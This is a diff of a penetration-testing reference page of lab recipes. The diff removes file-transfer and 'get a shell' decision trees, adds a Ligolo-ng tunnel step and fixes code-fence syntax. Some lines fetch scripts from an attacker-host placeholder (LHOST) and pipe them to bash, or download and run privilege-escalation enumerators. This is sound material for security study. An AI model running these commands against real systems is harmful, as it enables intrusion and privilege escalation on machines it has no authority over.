@@ -109,7 +109,7 @@ The upload command requires an uploadserver endpoint, not Python http.server.
 
 ## Notebook recipes
 
-123 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+122 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -923,49 +923,6 @@ export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
 
 </Accordion>
 
-<Accordion title="Quick Decision Tree">
-
-### Quick Decision Tree
-
-**File Transfers for Linux and Windows**
-
-```text
-DOWNLOADING TO WINDOWS:
-├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
-├── Only cmd.exe?       → certutil or bitsadmin
-├── Internal network?   → SMB (impacket-smbserver)
-├── Need fileless?      → IEX + DownloadString
-└── Nothing works?      → Base64 encode/decode via clipboard
-
-DOWNLOADING TO LINUX:
-├── Have curl/wget?     → Use them (simplest)
-├── Need fileless?      → curl | bash  or  wget -qO- | python3
-├── Have Python/PHP?    → Use language one-liners
-├── Nothing available?  → /dev/tcp bash trick
-└── Need encryption?    → OpenSSL s_server/s_client
-
-UPLOADING FROM WINDOWS:
-├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
-├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
-├── Internal network?   → SMB or WebDAV
-└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
-
-UPLOADING FROM LINUX:
-├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
-├── Have SCP?           → scp file user@attacker:/path/
-├── Have Python?        → python3 requests.post one-liner
-└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 <Accordion title="Setup Steps">
 
 ### Setup Steps
@@ -1767,6 +1724,26 @@ curl -H 'Host: APP_FQDN' http://TARGET_IP/
 
 </Accordion>
 
+<Accordion title="Create and start the tunnel">
+
+### Create and start the tunnel
+
+**Ligolo-ng: Quick Reference**
+
+```bash
+sudo ip route add 240.0.0.1/32 dev ligolo
+curl -I http://240.0.0.1:8080/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ligolo-ng: Quick Reference — Create and start the tunnel](/pivoting/ligolo#create-and-start-the-tunnel)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
 <Accordion title="Test an application before enumerating broadly">
 
 ### Test an application before enumerating broadly
@@ -1816,7 +1793,7 @@ curl -s http://LHOST:8000/LinEnum.sh | bash -s -- -t > /tmp/linenum.txt
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
+```bash
 wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
 curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
 ./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.
@@ -1833,7 +1810,7 @@ curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.s
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
+```bash
 wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
 curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
 ./lse.sh -l1 # shows interesting information that should help you to privesc
@@ -1968,49 +1945,6 @@ scp tool jbetty@<DMZ_IP>:/tmp/          # if you have SSH
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Pivoting and File Transfer: Field Reference — Downloading TO a Linux target](/cheatsheets/pivoting-file-transfer#downloading-to-a-linux-target)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Mental Model — &quot;What Do I Use When?&quot;">
-
-### Mental Model — "What Do I Use When?"
-
-**Ports, Protocols, and Services by Purpose**
-
-```text
-"I found an open port"
-├── Is it a file share?    → SMB (445), NFS (2049), FTP (21)
-├── Is it remote access?   → SSH (22), RDP (3389), WinRM (5985)
-├── Is it a web server?    → HTTP (80/443) → fingerprint → fuzz
-├── Is it email?           → SMTP (25), IMAP (143), POP3 (110)
-├── Is it a database?      → MySQL (3306), MSSQL (1433), Oracle (1521)
-├── Is it monitoring?      → SNMP (161), IPMI (623)
-└── Not sure?              → nmap -sV -sC <IP> -p <port>
-
-"I need to get files off the target"
-├── Linux → scp/sftp (22)
-├── Windows → SMB (445) or evil-winrm download
-├── Web → wget/curl
-└── Simple → python3 -m http.server (on target)
-
-"I need to get files onto the target"
-├── Linux → scp/sftp (22) or wget from attacker
-├── Windows → SMB, certutil, PowerShell wget
-├── Web upload → if upload form exists
-└── Simple → python3 -m http.server (on attacker)
-
-"I need a shell"
-├── Linux → SSH (22)
-├── Windows → Evil-WinRM (5985), PsExec (445), RDP (3389)
-└── Either → reverse shell via exploit
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Ports, Protocols, and Services by Purpose — Mental Model — "What Do I Use When?"](/reference/master-protocol-service-quick-reference#mental-model-—-what-do-i-use-when)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -2299,7 +2233,7 @@ curl --socks5-hostname 127.0.0.1:9050 -sS http://internal.lab.htb/
 ```bash
 # Route curl / ffuf / sqlmap through Burp (127.0.0.1:8080)
 curl -sk -x http://127.0.0.1:8080 https://TARGET_IP/
-ffuf -w WORDLIST -u http://TARGET_IP/FUZZ -x http://127.0.0.1:8080
+ffuf -w DIR_WORDLIST:FUZZ -u http://TARGET_IP/FUZZ -x http://127.0.0.1:8080
 sqlmap -r request.txt --proxy=http://127.0.0.1:8080 --batch
 ```
 
@@ -2773,6 +2707,8 @@ rg -n 'XXE-PROBE|entity|DOCTYPE|error' evidence/xxe/response.body
 - [Official documentation 2](https://github.com/jpillora/chisel)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
